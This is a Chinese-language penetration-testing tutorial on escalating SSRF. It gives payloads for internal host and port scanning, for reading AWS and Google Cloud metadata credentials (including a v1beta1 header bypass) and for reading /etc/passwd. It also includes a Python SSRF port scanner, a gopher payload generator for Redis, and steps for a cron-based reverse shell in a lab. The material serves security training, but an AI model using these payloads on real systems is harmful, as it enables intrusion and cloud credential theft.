
## 提升攻击影响

通过SSRF能实现什么通常取决于网络上发现的内部服务。根据情况，使用SSRF扫描网络上的可达主机、对内部机器进行端口扫描以识别内部服务、收集实例元数据、绕过访问控制、泄露机密数据，甚至在可达机器上执行代码。

### SSRF 网络扫描

#### 执行主机扫描

扫描网络上其他可达机器。**可达机器**是可以通过当前机器连接到的其他网络主机。这些内部机器可能托管数据库、内部网站和其他敏感功能，攻击者利用这些功能获利。要执行扫描，向易受攻击端点提供一系列内部IP地址，并观察服务器对每个地址的响应是否不同。例如，当你请求地址`10.0.0.1`时：

`url=https://10.0.0.1`

服务器可能响应此消息：

```log
Error: cannot upload image: http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
```

但当你请求地址`10.0.0.2`时：

`url=https://10.0.0.2`

服务器可能响应此消息：

```log
Error: cannot upload image: Connection Failed
```

推断`10.0.0.1`是网络上有效主机的地址，而`10.0.0.2`不是。利用服务器行为的差异，收集关于网络结构的信息，如可达主机的数量及其IP地址。

#### 执行端口扫描

使用SSRF对网络机器进行端口扫描，揭示这些机器上运行的服务。开放端口提供了机器上运行的服务的良好指示，因为服务通常在特定端口上运行。例如，默认情况下，SSH在22端口运行，HTTP在80端口运行，HTTPS在443端口运行。端口扫描结果通常指向你应该手动检查的端口，并帮助你计划针对所发现服务的进一步攻击。

向易受攻击端点提供不同端口号，然后确定服务器行为在端口之间是否不同。过程与扫描主机相同，只是这次切换端口号而不是主机。端口号范围从0到65,535。

假设你想找出内部机器上哪些端口是开放的。当你向内部机器上的80端口发送请求时，服务器响应此消息：

```log
Error: cannot upload image: http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
```

当你向同一机器上的11端口发送请求时，机器响应此消息：

```log
Error: cannot upload image: Connection Failed
```

我们可以推断该机器上的80端口是开放的，而11端口不是。根据这些错误消息作为触点，足以构建一个端口扫描器，利用应用程序测试开放/关闭端口。

从响应中也可判断该机器正在运行Apache Web服务器和Ubuntu Linux发行版。利用此处揭示的软件信息构造针对系统的进一步攻击。

#### 可用协议

根据所使用的解析器、应用程序中的特定漏洞以及像 cURL 那样打开套接字的函数，攻击者可能利用各种 URL 方案与内部服务器通信或查询。需要注意的一些常见 URI 方案包括：

- `http://`：标准 Web 流量
- `ftp://`：文件传输协议
- `file://`：本地文件访问
- `ldap://`：轻量级目录访问协议
- `ssh2://`：安全外壳协议（版本 2）
- `gopher://`：Gopher 协议，由于其发送原始有效载荷的能力而经常被用于 SSRF
- `dict://`：字典服务协议
- `jar://`：访问 Java 归档（JAR）文件

[SSRF 圣经](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)包含一张关于支持的扩展和协议的图表。

例如，在查看图表时，可以从特定列中注意到 cURL 扩展支持广泛的模式，包括但不限于 `gopher://`、`file://` 和 `tftp://`。这些对于旨在通过 SSRF 利用内部应用程序的攻击者特别有用。另一方面，LWP（Lotus Word Pro）扩展也提供了大量支持的模式列表。但 `dict://` 模式不在其中。

### 获取实例元数据

云计算服务允许企业在其他人的服务器上运行其应用程序。其中一项服务——Amazon Elastic Compute Cloud（EC2）——提供了一个实例元数据工具，使EC2实例能够通过查询`169.254.169.254`的API端点来访问有关自身的数据。实例是在云提供商基础设施上运行应用程序的虚拟服务器。Google Cloud提供了类似的实例元数据API服务。

除非网络管理员特别阻止或禁用，否则这些API端点默认是可访问的。这些服务揭示的信息通常非常敏感，可能允许攻击者将SSRF升级为严重的信息泄露甚至RCE。

#### 查询EC2元数据

如果公司在Amazon EC2上托管其基础设施，尝试使用此端点查询有关主机的各种实例元数据。例如，此API请求从正在运行的实例获取所有实例元数据：

`http://169.254.169.254/latest/meta-data/`

这些端点揭示诸如API密钥、Amazon S3令牌（用于访问Amazon S3存储桶的令牌）和密码等信息。尝试请求这些特别有用的API端点：

- `http://169.254.169.254/latest/meta-data/` 返回可查询的可用元数据列表。
- `http://169.254.169.254/latest/meta-data/local-hostname/` 返回主机使用的内部主机名。
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME` 返回该角色的安全凭据。
- `http://169.254.169.254/latest/dynamic/instance-identity/document/` 揭示当前实例的私有IP地址。
- `http://169.254.169.254/latest/user-data/` 返回当前实例上的用户数据。

[AWS API端点的完整文档](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)

#### 查询Google Cloud元数据

如果公司使用Google Cloud，请查询Google Instance Metadata API。Google对其API端点实施了额外的安全措施，因此查询Google Cloud Metadata APIv1需要以下特殊头之一：

```http
Metadata-Flavor: Google
X-Google-Metadata-Request: True
```

这些头提供SSRF防护，因为在SSRF期间，你通常无法为伪造请求指定特殊头。但轻松绕过此防护，因为通过APIv1可访问的大多数端点也可以通过API v1beta1端点访问。API v1beta1是元数据API的较旧版本，没有相同的头要求。首先针对这些关键端点：

- `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` 
  返回实例上默认账户的访问令牌。
- `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys` 
  返回可以连接到该项目中其他实例的SSH密钥。

[google 完整API文档](https://cloud.google.com/compute/docs/storing-retrieving-metadata)。请注意，API v1beta1于2020年被弃用，正在逐步关闭。将来，你可能需要使用APIv1查询元数据，并需要找到一种方法来伪造所需的头以请求使用Google Cloud的目标的实例元数据。

Amazon和Google并不是唯一提供元数据API的Web服务。然而，这两家公司控制了大部分市场份额，因此你正在测试的公司很可能在这些平台之一上。如果不是，DigitalOcean和Kubernetes集群也容易受到同样的问题影响：

- DigitalOcean，通过访问`http://169.254.169.254/metadata/v1/`端点来获取元数据端点列表，然后检索关键信息，如实例的主机名和用户数据。

- Kubernetes，尝试访问`https://kubernetes.default`和`https://kubernetes.default.svc/metrics`以获取有关系统的信息。

### 使用 SSRF 进行文件读取

SSRF 可能导致内部文件暴露，具体取决于应用程序允许的协议以及底层函数的具体实现。例如，考虑相同的易受攻击应用程序，通过提供 `file:///etc/passwd`，可以获取内部文件的内容。这是因为 `file_get_contents` 默认可以处理多种 URI 方案，包括访问本地文件的 `file://` 方案。类似地，可用于读取本地文件和访问网络上其他文件的 URI 方案在很大程度上取决于用于处理数据的底层函数。

### 示例：PHP Thumb 应用程序中的 SSRF

PHP Thumb 应用程序在代码审查期间发现了一个重大漏洞。此应用程序旨在获取外部图像，我们发现以下代码部分负责此功能：

**易受攻击的代码**
```php
if ($rawImageData = phpthumb_functions::SafeURLread($phpThumb->src, $error, $phpThumb->config_http_fopen_timeout, $phpThumb->config_http_follow_redirect)) {
    # 脆弱代码
    $phpThumb->DebugMessage('SafeURLread(' . $phpThumb->src . ') succeeded' . ($error ? ' with messages: "' . $error . '"' : ""), __FILE__, __LINE__);
    $phpThumb->DebugMessage('Setting source data from URL "' . $phpThumb->src . '"', __FILE__, __LINE__);
    $phpThumb->setSourceData($rawImageData, urlencode($phpThumb->src));
} else {
    $phpThumb->ErrorImage($error);
}

# 脆弱代码
if ($rawImageData = phpthumb_functions::SafeURLread($_GET['src'], $error, $phpThumb->config_http_fopen_timeout, $phpThumb->config_http_follow_redirect)) {
    $md5s = md5($rawImageData);
}
```

此代码基于 `src` 参数获取外部图像文件。一个关键问题是缺少检查来验证获取的图像是否为实际图像格式，例如 `.jpg`、`.png`、`.gif` 等。当调试模式设置为“True”时，将显示底层网络套接字返回的任何错误消息。攻击者利用此行为发起 SSRF 攻击。

#### 验证漏洞

为了验证漏洞，我们输入了已知具有特定开放端口（22、80、9929）的域 `scanme.nmap.org`。通过将这些端口以及多个已知关闭端口包含在我们的测试中，并启用调试模式，我们能够观察并记录系统对开放和关闭端口查询的响应。

探测开放端口：22

探测关闭端口：1337

在我们的进一步调查中，我们观察到针对某些协议（如 `file://`）的验证过程：

**代码**
```php
if (preg_match('#^(f|ht)tp\://#i', $phpThumb->src)) {
    // . . .
}
```

然而，此验证依赖于黑名单而不是白名单，因此攻击者使用其他协议（如 `gopher://` 或 `dict://`）来绕过此限制。我们将在后续部分中讨论这些协议。

### SSRF 到远程代码执行（RCE）

SSRF 漏洞根据上下文，可用于访问同一服务器（localhost）或易受攻击应用程序内部网络内的敏感数据。这是可能的，因为受攻击的应用程序可以向外部攻击者无法访问的内部服务发出请求。

将 SSRF 与其他漏洞结合使用可以导致 RCE，尤其是在针对 Redis 和 Memcached 等服务时。其他内存存储系统和数据库（如 RabbitMQ 和 Elasticsearch）如果配置错误，也可能容易受到 SSRF 攻击。

在渗透测试期间，遇到 Memcached 和 Redis 等服务很常见。Memcached 是一个以速度著称的内存 NoSQL 数据库。由于其非持久性特性，它可以存储会话 ID 等敏感细节。其默认缺乏身份验证和有限的日志记录功能使其成为攻击者的潜在目标。

Redis 是另一个内存数据结构存储，与 Memcached 有相似之处。Redis 专为受信任的内部网络设计，不会优先考虑严格的安全措施。虽然它提供密码保护，但这是可选的，一些安装可能忽略它，使 Redis 暴露于潜在威胁。

为了说明这一点，我们将使用“SSRF Redis Lab”，其中包含易受攻击的 Redis 服务 [https://github.com/rhamaa/Web-Hacking-Lab/tree/master/SSRF_REDIS_LAB]。

#### 扫描开放端口

部署应用程序后，第一步将是尝试探测开放/关闭端口，并通过 `url` 输入参数观察响应。

然而，这次为了自动化此过程，创建了一个 Python 脚本来评估开放端口。

**有效载荷**
```python
import requests

def portscan(port):
    headers = {
        'Content-Type': 'multipart/form-data; boundary=------------------4556449734826340594105716565'
    }
    data = '------------------4556449734826340594105716565\r\nContent-Disposition: form-data; name="url"\r\n\r\nhttp://127.0.0.1:' + str(port) + '\r\n------------------4556449734826340594105716565--\r\n'
    response = requests.post('http://10.0.2.15:1111/', headers=headers, data=data, verify=False)
    if not "Connection refused" in response.text:
        print("Port Found: " + str(port))

start_port = 1
end_port = 65535
for port in range(start_port, end_port + 1):
    portscan(port)
```

执行此脚本显示端口 6379（Redis 默认）、8080 和 53850 是开放的。

#### 与 Redis 和 Gopher 协议交互

接下来，我们将使用 Gopher 协议与 Redis 实例通信。当 Redis 客户端或应用程序与 Redis 实例通信时，它们使用 RESP（REdis 序列化协议）与 Redis 服务器通信。这是专为 Redis 设计的协议，可实现结构化和高效通信。

使用 RESP，可以直接发送纯文本命令，而无需手动按 RESP 格式构建它们。这样做时，命令之间用空格分隔。这就是你通过 telnet 会话手动与 Redis 交互时通常看到的。让我们看以下 Python 脚本：

**Python**
```python
# Python 脚本将 Redis 内联命令转换为 URL 编码的 Gopher 有效载荷
def generate_gopher_payload(command):
    payload = "gopher://127.0.0.1:6379/_%s" % command.replace('\r', "").replace('\n', '%0D%0A').replace(' ', '%20')
    return payload

cmd = "INFO\nquit"
gopherPayload = generate_gopher_payload(cmd)
print(gopherPayload)
```

此 Gopher 有效载荷旨在：

- 连接到在本地机器（127.0.0.1）上以其默认端口（6379）运行的 Redis 服务器。
- 发送 `INFO` 命令，检索有关 Redis 服务器的各种信息和统计信息。
- 接着是 `quit` 命令，用于关闭与 Redis 服务器的连接。

**命令：**
```
gopher://127.0.0.1:6379/_%0D%0AINFO%0D%0Aquit%0D%0A
```

注意：`%0D%0A` 模拟在 telnet 会话中按“Enter”的行为，这是向 Redis 服务器提交命令所必需的。

执行此有效载荷后，将显示有关 Redis 实例的信息。

#### 将 SSRF 与 Redis 结合以实现文件写入以获取 RCE

Redis 虽然主要是一个内存数据库，但也支持数据持久化。如果 Redis 实例以 root 权限运行，则容易被利用，允许恶意行为者向系统写入敏感文件。在 Linux 上下文中，此能力可能被滥用以操纵 cronjobs。

Cronjobs 在 Linux 系统中充当任务调度器，允许在预定义间隔执行命令。这些间隔和命令通常使用 `crontab` 命令设置。为了利用这一点，可以使用实验室中提供的 `payload_redis.py` 脚本，该脚本有助于为此特定漏洞生成恶意有效载荷 [https://raw.githubusercontent.com/rhamaa/Web-Hacking-Lab/master/SSRF_REDIS_LAB/payload_redis.py]。

**命令**
```bash
python2 payload_redis.py cron
```

- 该脚本将反向 IP 和端口作为输入，将获得反向 shell

- 然后通过 `url` 输入参数提交有效载荷

- 执行后，在端口 4455 上获得反向 shell
